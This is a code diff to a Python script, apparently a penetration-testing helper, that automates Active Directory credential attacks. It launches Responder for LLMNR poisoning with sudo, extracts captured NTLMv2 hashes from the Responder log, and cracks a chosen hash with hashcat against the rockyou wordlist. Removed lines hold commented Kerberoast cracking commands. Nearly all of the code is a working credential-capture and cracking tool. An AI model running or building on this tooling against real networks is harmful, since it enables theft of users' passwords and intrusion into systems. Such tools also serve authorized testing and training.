@@ -1,58 +1,107 @@
-import re, os, subprocess
+import re, os, subprocess, netifaces, signal
 
 def is_active_directory():
     pass
 
+def list_network_interfaces():
+    """List all network interfaces."""
+    interfaces = netifaces.interfaces()
+    print("Available network interfaces:")
+    for index, interface in enumerate(interfaces, start=1):
+        print(f"{index}. {interface}")
+    return interfaces
+
+def choose_network_interface():
+    """Allow the user to select a network interface."""
+    interfaces = list_network_interfaces()
+    choice = input("Enter the number of the network interface you want to use: ")
+    try:
+        choice = int(choice) - 1
+        if choice < 0 or choice >= len(interfaces):
+            raise ValueError
+        return interfaces[choice]
+    except ValueError:
+        print("Invalid selection. Please enter a valid number.")
+        return None
+
+def sigint_handler(signal, frame):
+    """Handle SIGINT signal without exiting the script."""
+    print("\nResponder stopped by user. Continuing with the script...")
+
 def llmnr_poisoning():
-    # sudo responder -I [interface]
-    pass
+    interface = choose_network_interface()
+    if interface is None:
+        return  # Stop if no valid interface is selected
 
-def kerberoasting():
-    # GetUserSPNs.py
-    pass
+    signal.signal(signal.SIGINT, sigint_handler)  # Setup the SIGINT handler
 
-# MAYBE
-def asrep_roasting():
-    pass
-
+    # Run Responder on the selected interface
+    print(f"Starting Responder on interface {interface}...")
+    try:
+        process = subprocess.Popen(['sudo', 'responder', '-I', interface])
+        process.wait()  # Wait for the process to complete
+        print("Responder has completed. Processing NTLM hashes...")
+        process_ntlm_hashes()  # Process the hashes after Responder completes
+    except subprocess.CalledProcessError as e:
+        print(f"Failed to start Responder: {e}")
+    finally:
+        signal.signal(signal.SIGINT, signal.SIG_DFL)  # Reset the SIGINT handler to default
 
 def process_ntlm_hashes():
     log_file_path = "/usr/share/responder/logs/Responder-Session.log"
     output_file_path = "/mnt/data/ntlmv2-hashes.txt"
 
-    bash_command = f"""
-    # Check if the log file exists, if not, exit the script or handle accordingly
-    if [ ! -f "{log_file_path}" ]; then
-        echo "Log file does not exist, exiting..."
-        exit 1
-    fi
+    if not os.path.exists(log_file_path):
+        print("Log file does not exist, exiting...")
+        return
 
-    while IFS= read -r line; do
-        # Use awk to extract the full hash, which includes the username
-        full_hash=$(echo "$line" | awk -F': ' '{{print $2}}')
+    with open(log_file_path, 'r') as file:
+        hashes = set(line.split(': ')[1] for line in file if "NTLMv2-SSP Hash" in line)
+    
+    with open(output_file_path, 'w') as file:
+        file.writelines(f"{hash}\n" for hash in hashes)
 
-        # Check if the full hash already exists in the output file
-        if ! grep -qF -- "$full_hash" "{output_file_path}"; then
-            # If the hash entry is not found, append it to the file
-            echo "$full_hash" >> "{output_file_path}"
-            echo "[*] Added: $full_hash"
-        fi
-    done < <(grep "NTLMv2-SSP Hash" "{log_file_path}")
-    """
+def choose_hash():
+    hashes_file_path = '/mnt/data/ntlmv2-hashes.txt'
+    if not os.path.exists(hashes_file_path):
+        print("Hashes file does not exist.")
+        return None
 
-    # Run the bash command using Python's subprocess module
-    process = subprocess.Popen(bash_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, executable='/bin/bash')
-    stdout, stderr = process.communicate()
+    with open(hashes_file_path, 'r') as file:
+        hashes = [line.strip() for line in file]
 
-    # Print the output and any errors
-    print(stdout.decode())
-    if stderr:
-        print("Errors:")
-        print(stderr.decode())
+    for index, hash in enumerate(hashes, start=1):
+        print(f"{index}. {hash}")
+
+    choice = input("Enter the number of the hash you want to crack: ")
+    try:
+        choice = int(choice) - 1
+        if choice < 0 or choice >= len(hashes):
+            raise ValueError
+        return hashes[choice]
+    except ValueError:
+        print("Invalid selection. Please enter a valid number.")
+        return None
+
+def crack_ntlmv2():
+    chosen_hash = choose_hash()
+    if chosen_hash:
+        hashcat_command = [
+            'hashcat', '-m', '5600', chosen_hash, '/usr/share/wordlists/rockyou.txt'
+        ]
+        try:
+            subprocess.run(hashcat_command, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+            print("Hashcat process completed.")
+        except subprocess.CalledProcessError as e:
+            print(f"Failed to crack hash: {e}")
+    else:
+        print("No valid hash was selected.")
+
+def basic_ad_enum():
+    # nbtscan, enum4linux
+    pass
 
 def list_hashes():
-    process_ntlm_hashes()
-
     hashes_file_path = '/mnt/data/ntlmv2-hashes.txt'
     # Check if the file exists before trying to open it
     if os.path.exists(hashes_file_path):
@@ -61,19 +110,3 @@ def list_hashes():
                 print(line.strip())
     else:
         print("Hashes file does not exist.")
-
-def basic_ad_enum():
-    # nbtscan, enum4linux
-    pass
-
-def crack_kerberoast_hash():
-    # hashcat -m 13100 -a 0 crackthis /usr/share/wordlists/rockyou.txt --outfile="cracked.txt" --force
-    # john crackthis -w=/usr/share/wordlists/rockyou.txt
-    pass
-
-def crack_ntlmv2():
-    # hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt
-    pass
-
-def crack_ntlm():
-    pass
